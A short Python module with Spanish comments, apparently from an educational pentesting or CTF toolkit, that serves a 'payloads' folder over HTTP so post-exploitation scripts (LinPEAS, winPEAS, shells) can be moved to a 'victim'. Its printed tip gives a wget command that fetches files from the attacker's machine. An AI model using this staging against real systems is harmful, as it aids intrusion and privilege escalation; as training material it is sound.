"""Servidor HTTP temporal para transferir payloads a la víctima."""
import os
import subprocess
from colorama import Fore, Style


def start_http_server_payloads(workspace_dir):
    print(f"\n{Fore.GREEN}==================================================================")
    print(f"{Fore.GREEN}[!] TIP EDUCATIVO: Transferencia de Archivos (Post-Explotación).{Style.RESET_ALL}")
    print(f"    Si ya conseguiste shell (RCE), a menudo necesitas subir LinPEAS u otros payloads.")
    print(f"    Esto permite descargar desde *tu máquina* usando: wget http://TU_IP/archivo")
    print(f"{Fore.GREEN}==================================================================\n")

    payload_dir = os.path.join(workspace_dir, "payloads")
    if not os.path.exists(payload_dir):
        os.makedirs(payload_dir)

    print(f"{Fore.CYAN}[*] Mueve tus scripts (linpeas.sh, winpeas.exe, shells) a: {Style.BRIGHT}{payload_dir}{Style.RESET_ALL}")
    port = input(f"{Fore.CYAN}[?] ¿En qué puerto quieres levantar el servidor? (Enter para 8000): ").strip()
    if not port:
        port = "8000"

    print(f"{Fore.YELLOW}[>] Ejecutando: python3 -m http.server {port} --directory {payload_dir}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Presiona Ctrl+C para apagar el servidor cuando termines.{Style.RESET_ALL}")
    try:
        subprocess.run(['python3', '-m', 'http.server', port, '--directory', payload_dir])
    except KeyboardInterrupt:
        print(f"{Fore.GREEN}\n[+] Servidor web de transferencia apagado. Retornando al menú.{Style.RESET_ALL}")
